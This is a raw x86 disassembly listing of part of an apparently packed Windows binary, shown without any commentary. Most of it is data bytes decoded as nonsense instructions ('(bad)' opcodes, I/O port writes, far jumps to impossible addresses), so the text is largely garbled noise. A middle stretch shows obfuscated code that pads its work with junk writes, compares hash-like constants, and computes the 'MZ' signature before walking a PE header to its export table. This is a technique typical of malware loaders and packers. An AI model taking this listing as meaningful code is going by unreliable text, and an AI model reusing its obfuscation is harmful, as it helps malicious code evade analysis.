  41ddb3:	fs xchg ecx,eax
  41ddb5:	adc    al,0xe5
  41ddb7:	out    dx,al
  41ddb8:	lds    edx,FWORD PTR [edx-0x7b]
  41ddbb:	push   0x14
  41ddbd:	sub    edi,DWORD PTR [bx+si+0x4fb3]
  41ddc2:	push   ss
  41ddc3:	call   0xdc856c32
  41ddc8:	push   cs
  41ddc9:	cdq    
  41ddca:	inc    ebx
  41ddcb:	repz push ecx
  41ddcd:	int3   
  41ddce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddd0:	sub    esp,DWORD PTR [eax-0x51dac6b4]
  41ddd6:	pop    eax
  41ddd7:	ds xchg edi,eax
  41ddd9:	push   ecx
  41ddda:	fnstenv [ecx-0xb]
  41dddd:	xchg   BYTE PTR [edi],bh
  41dddf:	aad    0xde
  41dde1:	ret    0xa9f0
  41dde4:	cwde   
  41dde5:	inc    edx
  41dde6:	mov    edx,0x2421c53e
  41ddeb:	sbb    ah,bh
  41dded:	add    ebp,ebp
  41ddef:	jne    0x41de0a
  41ddf1:	adc    esi,eax
  41ddf3:	shl    bh,0xd
  41ddf6:	and    eax,DWORD PTR [ebp-0x1739274b]
  41ddfc:	ins    BYTE PTR es:[edi],dx
  41ddfd:	fcomp  DWORD PTR [esi+0x5f]
  41de00:	mov    ch,0x6a
  41de02:	and    eax,0xe4661eef
  41de07:	and    al,0x14
  41de09:	ss jno 0x41de53
  41de0c:	sub    DWORD PTR ds:0x3d7c6b36,esi
  41de12:	push   esp
  41de13:	push   edx
  41de14:	test   edx,edx
  41de16:	fwait
  41de17:	xchg   DWORD PTR fs:[ebp+0x7ab976e],ebp
  41de1e:	jnp    0x41dddb
  41de20:	in     al,0xbc
  41de22:	jmp    0x3b1b083c
  41de27:	mov    ah,0xf8
  41de29:	lods   al,BYTE PTR ds:[esi]
  41de2a:	retf   0xdeb7
  41de2d:	push   edi
  41de2e:	imul   ebp,DWORD PTR [esi+0x47],0x906f81f4
  41de35:	add    sp,WORD PTR [ecx+esi*1-0x3a97ad1a]
  41de3d:	in     eax,dx
  41de3e:	or     bl,BYTE PTR [eax]
  41de40:	mov    WORD PTR [edx+0x74],?
  41de43:	pushf  
  41de44:	mov    edi,0xa5dee653
  41de49:	dec    edi
  41de4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de4b:	stc    
  41de4c:	sub    bh,cl
  41de4e:	cmp    esi,DWORD PTR [esi-0x22]
  41de51:	lea    esp,[ecx+0x2420940d]
  41de57:	aad    0x8a
  41de59:	call   0x5fb7:0xe930dd0a
  41de60:	jnp    0x41de38
  41de62:	sbb    al,0x73
  41de64:	xor    DWORD PTR [ebx+edx*4-0x63],ecx
  41de68:	and    edx,DWORD PTR [eax]
  41de6a:	rcl    bh,cl
  41de6c:	or     ecx,edi
  41de6e:	inc    edi
  41de6f:	aam    0x4
  41de71:	xchg   ebp,eax
  41de72:	out    dx,eax
  41de73:	gs iret 
  41de75:	imul   esi,DWORD PTR [ecx-0x39],0x40
  41de79:	push   cs
  41de7a:	push   ebx
  41de7b:	test   BYTE PTR [eax+0x20],bh
  41de7e:	adc    dh,0xf5
  41de81:	fiadd  DWORD PTR [ebx-0x5a]
  41de84:	xor    BYTE PTR [esi+ecx*1],bl
  41de87:	inc    edx
  41de88:	sbb    BYTE PTR [ecx-0x12],ch
  41de8b:	sub    BYTE PTR [edi-0x33],dl
  41de8e:	test   BYTE PTR [ebx+edi*8],dh
  41de91:	xchg   edx,eax
  41de92:	hlt    
  41de93:	shr    BYTE PTR [esi-0x1af36deb],0x32
  41de9a:	ss jl  0x41df0b
  41de9d:	fldcw  WORD PTR [ebx-0x1b]
  41dea0:	stos   BYTE PTR es:[edi],al
  41dea1:	aaa    
  41dea2:	popf   
  41dea3:	mov    cl,0xe4
  41dea5:	pusha  
  41dea6:	mov    ch,0x6
  41dea8:	cmp    BYTE PTR [edi+0x284f0d],bh
  41deae:	outs   dx,BYTE PTR ds:[esi]
  41deaf:	mov    ebp,0x9ea6d874
  41deb4:	out    dx,al
  41deb5:	add    BYTE PTR [ecx+0x5f],ah
  41deb8:	jb     0x41dedb
  41deba:	pop    edx
  41debb:	out    0xae,eax
  41debd:	call   0x1276:0x31bcc820
  41dec4:	sahf   
  41dec5:	or     bh,ah
  41dec7:	mov    al,0x8f
  41dec9:	cmc    
  41deca:	(bad)  
  41decb:	std    
  41decc:	jmp    0x41dee0
  41dece:	loop   0x41df25
  41ded0:	push   eax
  41ded1:	push   ebp
  41ded2:	xchg   ecx,eax
  41ded3:	div    BYTE PTR [ecx-0x79186d1c]
  41ded9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deda:	push   edi
  41dedb:	(bad)  
  41dedc:	test   al,0xc1
  41dede:	fwait
  41dedf:	in     eax,0x53
  41dee1:	shr    ch,cl
  41dee3:	jne    0x41dee9
  41dee5:	or     esi,DWORD PTR [eax]
  41dee7:	ins    BYTE PTR es:[edi],dx
  41dee8:	loopne 0x41df2d
  41deea:	adc    ah,cl
  41deec:	dec    ebx
  41deed:	sbb    eax,0x2ccd9ce
  41def2:	call   0x7aff:0xef29de1f
  41def9:	sbb    DWORD PTR [edx+0x41],ebx
  41defc:	inc    ecx
  41defd:	aas    
  41defe:	pop    ecx
  41deff:	bound  edx,QWORD PTR [ebx]
  41df01:	dec    edx
  41df02:	fidivr WORD PTR [ebx]
  41df04:	rol    BYTE PTR [eax+edx*2+0x10],1
  41df08:	(bad)  
  41df09:	addr16 and ah,ch
  41df0c:	lea    ebx,[eax-0x37]
  41df0f:	pop    eax
  41df10:	lock outs dx,BYTE PTR ds:[esi]
  41df12:	jmp    0x41df40
  41df14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df15:	push   cs
  41df16:	pop    edi
  41df17:	sub    BYTE PTR [ebp+eiz*4-0x8],dl
  41df1b:	(bad)  
  41df1c:	sbb    DWORD PTR [ecx+0x68],ecx
  41df1f:	aam    0x54
  41df21:	js     0x41dec0
  41df23:	pop    esi
  41df24:	jbe    0x41df3a
  41df26:	push   ebp
  41df27:	adc    ecx,edi
  41df29:	inc    esi
  41df2a:	jge    0x41df0a
  41df2c:	sub    bl,cl
  41df2e:	lods   al,BYTE PTR ds:[esi]
  41df2f:	pop    esi
  41df30:	xor    al,0x5f
  41df32:	xchg   esp,eax
  41df33:	push   0x787ad175
  41df38:	xchg   edi,eax
  41df39:	out    0x68,eax
  41df3b:	jle    0x41df26
  41df3d:	or     al,0x48
  41df3f:	addr16 pop edx
  41df41:	std    
  41df42:	xchg   esi,eax
  41df43:	cmp    al,0xca
  41df45:	lock mov dh,0x3a
  41df48:	popa   
  41df49:	or     BYTE PTR [edx+0x2370a7ed],bh
  41df4f:	dec    edi
  41df50:	imul   ebp,esi,0xffe6d394
  41df56:	std    
  41df57:	push   eax
  41df58:	(bad)  
  41df59:	and    ebx,ebx
  41df5b:	push   edx
  41df5c:	shl    DWORD PTR [edi],cl
  41df5e:	mov    dh,0x79
  41df60:	mov    ds:0x407b14bd,al
  41df65:	loopne 0x41dfe0
  41df67:	xchg   edx,eax
  41df68:	psubusw mm2,QWORD PTR [esp+edx*8]
  41df6c:	(bad)  
  41df6e:	push   eax
  41df6f:	aaa    
  41df70:	outs   dx,BYTE PTR ds:[esi]
  41df71:	arpl   ax,di
  41df73:	out    0x0,eax
  41df75:	and    DWORD PTR [eax],edi
  41df77:	pushf  
  41df78:	das    
  41df79:	shl    BYTE PTR [edi+esi*4-0x1b],0xb0
  41df7e:	lods   eax,DWORD PTR ds:[esi]
  41df7f:	out    0x36,eax
  41df81:	push   eax
  41df82:	mul    ah
  41df84:	shl    edx,1
  41df86:	jbe    0x41df50
  41df88:	sbb    al,0xb2
  41df8a:	neg    DWORD PTR [ebx+eax*4]
  41df8d:	adc    BYTE PTR [ebx+0x4c677aef],ch
  41df93:	mov    eax,0xbd31d4ca
  41df98:	mov    bh,0x94
  41df9a:	sbb    ah,BYTE PTR [edi-0x6a43fa3c]
  41dfa0:	ss out dx,al
  41dfa2:	lahf   
  41dfa3:	push   esi
  41dfa4:	(bad)  
  41dfa5:	cmp    BYTE PTR gs:[ebx+eax*8-0xbff5c9a],0xba
  41dfae:	fimul  DWORD PTR [ecx-0x3206ab7b]
  41dfb4:	mov    ebp,0x82a8c0c5
  41dfb9:	iret   
  41dfba:	aam    0xcf
  41dfbc:	pop    ebx
  41dfbd:	aad    0xac
  41dfbf:	test   al,0xe3
  41dfc1:	scas   eax,DWORD PTR es:[di]
  41dfc3:	test   eax,0xf7efb3e9
  41dfc8:	daa    
  41dfc9:	xchg   edx,eax
  41dfca:	sti    
  41dfcb:	cmp    eax,0x8230ffec
  41dfd0:	cmp    al,0x38
  41dfd2:	mov    ch,0xc1
  41dfd4:	push   ecx
  41dfd5:	stos   DWORD PTR es:[edi],eax
  41dfd6:	push   0x6fd8c07a
  41dfdb:	adc    al,0xa4
  41dfdd:	mov    bl,0xfe
  41dfdf:	xchg   edi,eax
  41dfe0:	fld    QWORD PTR [esi]
  41dfe2:	push   ecx
  41dfe3:	sbb    DWORD PTR [eax+0x72],0x95dc1a97
  41dfea:	push   ds
  41dfeb:	jmp    eax
  41dfed:	xchg   ebx,eax
  41dfee:	in     eax,dx
  41dfef:	jae    0x41df72
  41dff1:	mov    edx,0x52485480
  41dff6:	sub    ecx,ecx
  41dff8:	stos   BYTE PTR es:[edi],al
  41dff9:	mov    edx,0xcf37dcd4
  41dffe:	add    BYTE PTR [esi-0x7c],dl
  41e001:	stos   BYTE PTR es:[edi],al
  41e002:	das    
  41e003:	xor    eax,0xc46a4ce5
  41e008:	and    edi,edi
  41e00a:	sub    DWORD PTR [esi],esi
  41e00c:	push   cs
  41e00d:	jg     0x41e06a
  41e00f:	push   0xa56c31f6
  41e014:	loopne 0x41dfbf
  41e016:	jne    0x41e079
  41e018:	shr    BYTE PTR [esi-0x41a92232],0x3f
  41e01f:	sub    ebx,edx
  41e021:	das    
  41e022:	das    
  41e023:	xchg   DWORD PTR [ebx+0x1fd80ec0],ecx
  41e029:	out    dx,al
  41e02a:	cld    
  41e02b:	sbb    esp,DWORD PTR [edi-0x27d3ab11]
  41e031:	mov    edi,0x74db67e0
  41e036:	mov    DWORD PTR [edx+0x7b0d5a8b],eax
  41e03c:	ror    BYTE PTR [esi+ebp*4+0x6575cde4],1
  41e043:	sbb    dl,dl
  41e045:	adc    al,0x60
  41e047:	mov    al,0x13
  41e049:	mov    ah,0x87
  41e04b:	(bad)  
  41e04c:	imul   ebx,DWORD PTR [ecx-0x7a],0xffffffcb
  41e050:	dec    eax
  41e051:	mov    DWORD PTR [esi-0x3f4ac404],ecx
  41e057:	sub    ebx,DWORD PTR [eax-0x22ae847c]
  41e05d:	shl    BYTE PTR [edi],1
  41e05f:	cmp    DWORD PTR [esi-0x73ec9838],edx
  41e065:	stc    
  41e066:	xchg   edi,eax
  41e067:	dec    esi
  41e068:	sub    DWORD PTR [edi+0x3d2281e6],edi
  41e06e:	push   ecx
  41e06f:	popf   
  41e070:	mov    eax,ds:0xe7fb9422
  41e075:	hlt    
  41e076:	dec    ebx
  41e077:	mov    gs,edi
  41e079:	mov    esi,0x54dc9614
  41e07e:	inc    ecx
  41e07f:	scas   eax,DWORD PTR es:[edi]
  41e080:	cli    
  41e081:	jmp    0x41e0f9
  41e083:	lea    ebx,[esi-0x35]
  41e086:	push   0x28f5c095
  41e08b:	shr    DWORD PTR [ecx-0x2d17506d],0x11
  41e092:	push   edi
  41e093:	aam    0x62
  41e095:	mov    al,0x58
  41e097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e098:	sub    bl,BYTE PTR [ebx-0x5adecd82]
  41e09e:	sub    bl,0x71
  41e0a1:	sbb    ecx,DWORD PTR [edi]
  41e0a3:	ins    BYTE PTR es:[edi],dx
  41e0a4:	push   ss
  41e0a5:	jl     0x41e123
  41e0a7:	pop    ds
  41e0a8:	std    
  41e0a9:	and    eax,0x6313c4e7
  41e0ae:	lods   al,BYTE PTR ds:[esi]
  41e0af:	cmc    
  41e0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0b1:	mov    eax,0x3f0833b1
  41e0b6:	and    eax,0x3dc993e0
  41e0bb:	xchg   ecx,eax
  41e0bc:	pop    ds
  41e0bd:	xchg   esp,eax
  41e0be:	jo     0x41e087
  41e0c0:	add    eax,0x428e3f
  41e0c5:	push   esp
  41e0c6:	adc    eax,DWORD PTR [eax]
  41e0c8:	add    BYTE PTR [edi],cl
  41e0ca:	test   DWORD PTR [ecx],esi
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    BYTE PTR [ebx],bh
  41e0d0:	xrelease mov DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	cmp    ax,0x4c6b
  41e386:	mov    ds:0x8382dacb,eax
  41e38b:	daa    
  41e38c:	pusha  
  41e38d:	add    DWORD PTR [ebx-0x266be8e1],0x2b
  41e394:	adc    eax,0x1f1b7c9c
  41e399:	test   al,0x3c
  41e39b:	cwde   
  41e39c:	fsubr  DWORD PTR [edx+0x11]
  41e39f:	push   edx
  41e3a0:	mov    ah,0xa1
  41e3a2:	pop    eax
  41e3a3:	inc    eax
  41e3a4:	loope  0x41e393
  41e3a6:	(bad)  
  41e3a7:	(bad)  
  41e3a8:	mov    DWORD PTR [edi+0x3c2f056b],esp
  41e3ae:	cmp    eax,DWORD PTR [ecx-0x54bfa985]
  41e3b4:	adc    BYTE PTR [ecx+0x3ce3a169],dh
  41e3ba:	push   ds
  41e3bb:	les    ecx,FWORD PTR [edx+0x25703332]
  41e3c1:	shr    DWORD PTR [edx+0x124847cb],cl
  41e3c7:	cmp    BYTE PTR [ecx],0x8c
  41e3ca:	push   es
  41e3cb:	add    ah,al
  41e3cd:	dec    esp
  41e3ce:	rcl    BYTE PTR [ecx+0x45],cl
  41e3d1:	bound  eax,QWORD PTR [eax+esi*4-0x5769aba3]
  41e3d8:	scas   al,BYTE PTR es:[edi]
  41e3d9:	push   cs
  41e3da:	stc    
  41e3db:	fistp  WORD PTR [eax+0x1f]
  41e3de:	xchg   BYTE PTR [edx-0x3d],bh
  41e3e1:	jae    0x41e44c
  41e3e3:	into   
  41e3e4:	dec    ebp
  41e3e5:	xchg   ebp,eax
  41e3e6:	mul    DWORD PTR [ebx]
  41e3e8:	cmp    esp,DWORD PTR es:[ebx]
  41e3eb:	fcomp  QWORD PTR [ebx+0x57]
  41e3ee:	dec    esp
  41e3ef:	mov    DWORD PTR [ebx+0x54],edi
  41e3f2:	js     0x41e43d
  41e3f4:	pop    ecx
  41e3f5:	pop    eax
  41e3f6:	or     al,0x26
  41e3f8:	xlat   BYTE PTR ds:[ebx]
  41e3f9:	mul    DWORD PTR [ebp+0x4273ac82]
  41e3ff:	aam    0xe2
  41e401:	mov    al,ds:0x5fd39101
  41e406:	jno    0x41e3e7
  41e408:	mov    ds:0x1de6705,al
  41e40d:	in     al,0x9e
  41e40f:	out    0x34,eax
  41e411:	daa    
  41e412:	out    0x80,eax
  41e414:	daa    
  41e415:	pop    ebx
  41e416:	jns    0x41e461
  41e418:	jnp    0x41e3bc
  41e41a:	inc    esp
  41e41b:	push   0xbe445655
  41e420:	nop
  41e421:	arpl   WORD PTR [ecx-0x2],cx
  41e424:	xlat   BYTE PTR ds:[ebx]
  41e425:	shr    BYTE PTR [ecx-0x3a],1
  41e428:	mov    eax,ds:0x56234611
  41e42d:	dec    ebp
  41e42e:	sbb    eax,0x1aeeb5e9
  41e433:	leave  
  41e434:	lahf   
  41e435:	cmove  esi,DWORD PTR [ecx+0x7d]
  41e439:	in     eax,0x1c
  41e43b:	lea    edx,[edi-0x34]
  41e43e:	mov    ch,0x8b
  41e440:	loopne 0x41e42f
  41e442:	xchg   esp,eax
  41e443:	or     BYTE PTR [esi+0x66a0bcfa],ah
  41e449:	pop    es
  41e44a:	leave  
  41e44b:	loop   0x41e44d
  41e44d:	ss mov esi,0xf956a862
  41e453:	xchg   esp,eax
  41e454:	pop    ss
  41e455:	bound  esi,QWORD PTR [ebx-0x236d031a]
  41e45b:	lods   al,BYTE PTR ds:[esi]
  41e45c:	in     eax,0xe3
  41e45e:	push   es
  41e45f:	cmp    DWORD PTR [ecx+0x12],esi
  41e462:	test   al,0x3
  41e464:	xchg   ebp,eax
  41e465:	sub    eax,0x230a2513
  41e46a:	nop
  41e46b:	jp     0x41e423
  41e46d:	sub    ecx,DWORD PTR [edx+0x33]
  41e470:	adc    eax,0xcf2f86ec
  41e475:	xor    BYTE PTR [ecx],dh
  41e477:	mov    dh,BYTE PTR [ebp+0x61]
  41e47a:	mov    ecx,0xdff8fcde
  41e47f:	call   0xda345233
  41e484:	push   0x1bcc857f
  41e489:	add    BYTE PTR [esi+0x2c],al
  41e48c:	jmp    0x41e422
  41e48e:	mov    eax,0x338c5fe0
  41e493:	(bad)  
  41e494:	mov    cl,0x7
  41e496:	scas   eax,DWORD PTR es:[edi]
  41e497:	cs inc ecx
  41e499:	in     al,0x2f
  41e49b:	xor    edx,ebp
  41e49d:	cmp    esi,ebx
  41e49f:	mov    WORD PTR [eax+edx*8],ds
  41e4a2:	cmp    DWORD PTR [esp+eiz*2-0xb],ebx
  41e4a6:	daa    
  41e4a7:	xchg   ebx,eax
  41e4a8:	test   edx,ecx
  41e4aa:	jb     0x41e4ef
  41e4ac:	mov    WORD PTR [esi+esi*1-0x10],gs
  41e4b0:	ror    BYTE PTR [ebp+0x7f],1
  41e4b3:	call   0xd7f8377f
  41e4b8:	push   es
  41e4b9:	mov    ah,0xb1
  41e4bb:	dec    ebx
  41e4bc:	sbb    al,0x3d
  41e4be:	aam    0x89
  41e4c0:	pop    edx
  41e4c1:	imul   eax,DWORD PTR [esi],0xdc536001
  41e4c7:	xor    ebx,DWORD PTR [esi]
  41e4c9:	mov    esp,0x991d9061
  41e4ce:	or     eax,0xf837d721
  41e4d3:	add    bh,BYTE PTR [ecx+0x75]
  41e4d6:	(bad)  
  41e4d7:	and    esp,eax
  41e4d9:	loope  0x41e472
  41e4db:	cmp    bh,BYTE PTR [edi-0x14]
  41e4de:	ret    0x3766
  41e4e1:	push   edx
  41e4e2:	or     eax,0x1ab38021
  41e4e7:	mov    ch,0x68
  41e4e9:	mov    ds:0x65c92cb2,eax
  41e4ee:	or     edi,edx
  41e4f0:	ret    0xe5fc
  41e4f3:	idiv   DWORD PTR ds:0xe276c612
  41e4f9:	jmp    0x77be:0x209c0651
  41e500:	retf   0x544b
  41e503:	xchg   esp,eax
  41e504:	loope  0x41e48e
  41e506:	popf   
  41e507:	out    dx,eax
  41e508:	fadd   QWORD PTR [ebx-0x502b8523]
  41e50e:	test   al,0xf9
  41e510:	mov    eax,ds:0x6287cc0
  41e515:	shl    al,1
  41e517:	mul    bh
  41e519:	jb     0x41e55e
  41e51b:	add    BYTE PTR [edi],dh
  41e51d:	rcr    BYTE PTR [eax+0x4fd1dbe4],1
  41e523:	imul   ebp,esi,0xfffffffe
  41e526:	add    eax,0x716b4367
  41e52b:	cmp    al,0x45
  41e52d:	icebp  
  41e52e:	loop   0x41e5ac
  41e530:	(bad)  
  41e531:	push   ebx
  41e532:	pop    esp
  41e533:	add    eax,0xd2362631
  41e538:	test   eax,0x31b8af1a
  41e53d:	or     BYTE PTR [edi+0x396802c8],0x18
  41e544:	neg    cl
  41e546:	sbb    esi,esi
  41e548:	jecxz  0x41e516
  41e54a:	std    
  41e54b:	hlt    
  41e54c:	imul   esp,DWORD PTR [esi],0x15
  41e54f:	mov    dl,0xc5
  41e551:	adc    ch,cl
  41e553:	into   
  41e554:	and    eax,0x23744df
  41e559:	mov    ch,0xae
  41e55b:	gs in  al,dx
  41e55d:	adc    al,0xd1
  41e55f:	sub    eax,0x6292cf3c
  41e564:	jae    0x41e55e
  41e566:	dec    esp
  41e567:	jmp    DWORD PTR [ebx-0x7e]
  41e56a:	dec    ecx
  41e56b:	iret   
  41e56c:	out    dx,al
  41e56d:	stos   DWORD PTR es:[edi],eax
  41e56e:	enter  0x9b6d,0x49
  41e572:	fisub  WORD PTR [eax+eax*4-0x5af1acc4]
  41e579:	pop    ds
  41e57a:	mov    ah,0x6e
  41e57c:	jns    0x41e59a
  41e57e:	jecxz  0x41e56b
  41e580:	adc    BYTE PTR [edx+0xe8eab80],dh
  41e586:	into   
  41e587:	mov    dl,0xf7
  41e589:	pop    es
  41e58a:	push   ebx
  41e58b:	in     eax,dx
  41e58c:	stos   DWORD PTR es:[edi],eax
  41e58d:	push   ds
  41e58e:	jl     0x41e566
  41e590:	imul   ebp,DWORD PTR [ebx+0x5c],0xffffffe6
  41e594:	jecxz  0x41e5b5
  41e596:	fwait
  41e597:	mov    dl,0x5
  41e599:	sbb    DWORD PTR [esi-0x5a],edi
  41e59c:	xchg   BYTE PTR [esp+eiz*8],cl
  41e59f:	cmp    eax,DWORD PTR [eax-0x3f62701]
  41e5a5:	ror    DWORD PTR [ebp+0x6079b80f],1
  41e5ab:	leave  
  41e5ac:	push   ss
  41e5ad:	inc    eax
  41e5ae:	cmp    eax,0x5ad3ba13
  41e5b3:	pop    ds
  41e5b4:	sbb    al,0x37
  41e5b6:	cwde   
  41e5b7:	lods   al,BYTE PTR ds:[esi]
  41e5b8:	clc    
  41e5b9:	push   eax
  41e5ba:	mov    al,ds:0xec96229a
  41e5bf:	std    
  41e5c0:	or     cl,BYTE PTR [edi+edi*1-0x63]
  41e5c4:	pop    ecx
  41e5c5:	push   ds
  41e5c6:	int3   
  41e5c7:	add    BYTE PTR [ebx],ah
  41e5c9:	or     esi,eax
  41e5cb:	xchg   esp,eax
  41e5cc:	dec    ecx
  41e5cd:	xor    eax,0x178e0cc7
  41e5d2:	bnd jge 0x41e5d5
  41e5d5:	cmp    BYTE PTR [esi+0x59d81181],ch
  41e5db:	es loopne 0x41e63b
  41e5de:	retw   
  41e5e0:	cli    
  41e5e1:	jge    0x41e5d4
  41e5e3:	loop   0x41e5a8
  41e5e5:	(bad)  
  41e5e6:	push   cs
